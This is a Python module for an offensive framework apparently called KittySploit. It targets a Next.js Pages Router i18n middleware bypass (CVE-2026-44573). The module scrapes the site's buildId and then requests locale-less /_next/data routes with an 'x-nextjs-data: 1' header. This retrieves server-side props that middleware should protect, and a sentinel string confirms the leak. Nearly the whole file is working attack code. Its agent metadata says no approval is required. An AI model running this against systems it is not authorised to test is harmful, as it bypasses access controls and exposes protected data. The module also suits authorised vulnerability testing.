#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js i18n Pages data-route middleware bypass (CVE-2026-44573)",
        "description": (
            "Pages Router with i18n exposes `/_next/data/<buildId>/<locale>/<page>.json`. On vulnerable "
            "Next.js, `/_next/data/<buildId>/<page>.json` (no locale) can skip the middleware matcher "
            "while `x-nextjs-data: 1` forces the data handler — leaking getServerSideProps JSON that "
            "should have been gated. Set `sentinel` to a string your protected page embeds in props."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-44573",
        "references": ["https://github.com/advisories/GHSA-36qx-fr4f-26g5"],
        "tags": ["http", "nextjs", "i18n", "middleware", "scanner", "pages-router"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    home_path = OptString("/", "Path to fetch for __NEXT_DATA__ buildId scrape (usually /)", required=False)
    protected_path = OptString("/secret", "Gated page path (e.g. /secret → …/secret.json data URL)", required=False)
    default_locale = OptString("en", "Default locale segment for canonical data URL variant B", required=False)
    build_id = OptString("", "Override buildId; empty = auto from __NEXT_DATA__ on home_path", required=False, advanced=True)
    sentinel = OptString(
        "SECRET_PROPS_FLAG",
        "Substring that must appear in JSON body when bypass succeeds (from your gSSP props)",
        required=False,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _origin(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}"

    def _full(self, rel):
        rel = (rel or "/").strip() or "/"
        if not rel.startswith("/"):
            rel = "/" + rel
        return self._origin() + rel

    def _get_path(self, rel, extra_headers=None):
        url = self._full(rel)
        kw = dict(allow_redirects=False, timeout=float(self._o(self.timeout)))
        if extra_headers:
            kw["headers"] = extra_headers
        try:
            r = self.get(url, **kw)
            loc = (r.headers.get("Location") or "").strip()
            ct = (r.headers.get("Content-Type") or "").strip()
            return r.status_code, loc, ct, r.content[:200_000], None
        except Exception as e:
            return 0, "", "", b"", str(e)
        finally:
            if extra_headers:
                for k in extra_headers:
                    self.session.headers.pop(k, None)

    def _resolve_build_id(self):
        manual = str(self._o(self.build_id) or "").strip()
        if manual:
            return manual, None
        home = str(self._o(self.home_path) or "/").strip() or "/"
        code, _, _, body, err = self._get_path(home)
        if err:
            return None, err
        if not code:
            return None, "empty response status"
        text = body.decode("utf-8", "replace")
        m = re.search(r'"buildId"\s*:\s*"([^"]+)"', text)
        return (m.group(1) if m else None), None

    def _data_headers(self):
        return {"x-nextjs-data": "1"}

    def _probe_variants(self, bid, prot, loc):
        hdr = self._data_headers()
        a_rel = f"/_next/data/{bid}{prot}.json"
        b_rel = f"/_next/data/{bid}/{loc}{prot}.json"
        a_code, a_loc, a_ct, a_body, a_err = self._get_path(a_rel, hdr)
        b_code, b_loc, b_ct, b_body, b_err = self._get_path(b_rel, hdr)
        return (
            ("A", a_rel, a_code, a_loc, a_ct, a_body, a_err),
            ("B", b_rel, b_code, b_loc, b_ct, b_body, b_err),
        )

    @staticmethod
    def _hit(code, body, needle):
        if code != 200 or not needle:
            return False
        return needle in body.decode("utf-8", "replace")

    def check(self):
        bid, err = self._resolve_build_id()
        if not bid:
            return {
                "vulnerable": False,
                "reason": f"No buildId ({err or 'not found in __NEXT_DATA__'})",
                "confidence": "high",
            }
        prot = str(self._o(self.protected_path) or "/secret").strip() or "/secret"
        if not prot.startswith("/"):
            prot = "/" + prot
        loc = str(self._o(self.default_locale) or "en").strip() or "en"
        needle = str(self._o(self.sentinel) or "").strip()
        if not needle:
            return {"vulnerable": False, "reason": "sentinel option is empty", "confidence": "high"}

        bc, bloc, _, _, be = self._get_path(prot)
        if be:
            return {"vulnerable": False, "reason": f"Baseline GET failed: {be}", "confidence": "high"}
        variants = self._probe_variants(bid, prot, loc)
        hits = []
        for tag, rel, code, _, _, body, verr in variants:
            row = {"variant": tag, "path": rel, "http_code": code, "error": verr}
            if not verr:
                row["sentinel_match"] = self._hit(code, body, needle)
            hits.append(row)
        if any(h.get("sentinel_match") for h in hits):
            return {
                "vulnerable": True,
                "reason": f"Data route returned 200 with sentinel in body (buildId={bid})",
                "confidence": "high",
                "build_id": bid,
                "baseline": {"code": bc, "location": bloc},
                "variants": hits,
            }
        return {
            "vulnerable": False,
            "reason": "No variant returned HTTP 200 with sentinel; likely patched, wrong path, or sentinel mismatch",
            "confidence": "medium",
            "build_id": bid,
            "baseline": {"code": bc, "location": bloc},
            "variants": hits,
        }

    def run(self) -> bool:
        needle = str(self._o(self.sentinel) or "").strip()
        if not needle:
            print_error("Set option `sentinel` to a string your protected page exposes in props.")
            return False

        print_status("[1/4] Resolve buildId")
        bid, err = self._resolve_build_id()
        prot = str(self._o(self.protected_path) or "/secret").strip() or "/secret"
        if not prot.startswith("/"):
            prot = "/" + prot
        loc = str(self._o(self.default_locale) or "en").strip() or "en"
        print_info(f"Origin: {self._origin()}")
        print_info(f"Protected path: {prot}  locale: {loc}  sentinel: {needle!r}")
        if str(self._o(self.build_id) or "").strip():
            print_status(f"  buildId (manual): {bid}")
        else:
            print_status(f"  buildId (scraped): {bid or '(failed)'}")
        if err and not str(self._o(self.build_id) or "").strip():
            print_warning(f"  scrape note: {err}")
        if not bid:
            print_error("No buildId — set option `build_id` or ensure home_path returns __NEXT_DATA__ with buildId.")
            return False

        print_status(f"[2/4] Baseline GET {prot}")
        bc, bloc, _, _, be = self._get_path(prot)
        if be:
            print_error(f"Baseline failed: {be}")
            return False
        print_status(f"  HTTP {bc}  Location: {bloc or '(none)'}")

        print_status("[3/4] Data routes with x-nextjs-data: 1")
        variants = self._probe_variants(bid, prot, loc)
        vuln = False
        for tag, rel, code, rloc, ct, body, verr in variants:
            print_status(f"  GET {rel}")
            if verr:
                print_status(f"    error: {verr}")
                continue
            print_status(f"    HTTP {code}  Content-Type: {ct or '(none)'}")
            if rloc:
                print_status(f"    Location: {rloc}")
            if self._hit(code, body, needle):
                print_error(f"    Vulnerable — variant {tag}: 200 + sentinel in body.")
                vuln = True

        print_status("[4/4] Verdict")
        if vuln:
            print_error("Target appears vulnerable (middleware bypass on data route).")
            return True
        print_success("No bypass signal (patched, wrong buildId/path, or sentinel not in response).")
        return False
